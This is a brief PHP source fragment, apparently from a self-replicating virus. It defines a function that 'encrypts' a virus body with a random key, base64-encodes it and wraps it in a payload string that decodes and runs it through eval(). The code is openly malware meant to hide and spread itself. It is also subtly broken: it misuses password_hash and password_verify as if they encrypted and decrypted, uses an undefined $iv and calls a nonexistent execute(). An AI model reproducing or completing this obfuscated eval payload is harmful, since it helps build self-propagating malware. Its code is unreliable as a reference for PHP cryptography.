<?php
    //VIRUS:END
    function encryptedVirus($virus){
        //Generate Key
        $str = '0123456789abcdef';
        $key = '';
        for($i=0; $i<64; ++$i) $key .= $str[rand(0, strlen($str)-1)];

        // pack the key into a binary format
        $key = pack('H*', $key);
        
        $encryptedVirus = password_hash(["$key", "$virus"], PASSWORD_DEFAULT);
        
        //Encode
        $encodedVirus = base64_encode($encryptedVirus);
        $encodedIV = base64_encode($iv);
        $encodedKey = base64_encode($key);


        //payload in form of a virus itself.
        $payload = "
            \$encodedVirus = '$encodedVirus';
            \$key = '$encodedKey';
        

            //Decrypt
            \$virus = password_verify([\$key, \$virus], [\$encodedKey, \$encodedVirus]);
            eval(\$virus);
            execute(\$virus);
        ";
        
        return $payload;
    }

